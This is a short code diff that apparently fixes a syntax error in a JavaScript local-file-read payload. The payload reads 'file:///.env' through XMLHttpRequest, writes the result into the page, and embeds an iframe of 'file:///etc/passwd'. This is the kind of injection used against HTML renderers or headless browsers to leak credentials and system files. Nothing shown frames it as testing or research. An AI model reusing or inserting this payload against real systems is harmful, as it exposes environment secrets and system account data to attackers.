@@ -18,7 +18,7 @@ console.log(x.send());
 
 x=new XMLHttpRequest;
 x.onload=function(){document.write(this.responseText)};
-x.open("GET","file:///.env);
+x.open("GET","file:///.env");
 console.log(x.send());
 document.write('<iframe src=file:///etc/passwd></iframe>');
 
